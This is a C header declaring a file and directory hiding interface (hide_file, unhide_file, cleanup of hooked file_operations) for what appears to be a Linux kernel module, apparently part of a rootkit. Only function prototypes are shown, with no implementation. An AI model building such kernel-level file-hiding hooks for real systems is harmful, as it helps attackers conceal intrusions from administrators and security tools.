/* hide_file.h — 文件 / 目录隐藏接口 */
#ifndef _HIDE_FILE_H_
#define _HIDE_FILE_H_

int hide_file(const char *path);
int hide_file_app(const char *path);
int unhide_file(const char *path);

/* Called only from module_exit after all cloned file_operations users have
 * released their module references. */
void cleanup_retired_hooks(void);

#endif /* _HIDE_FILE_H_ */
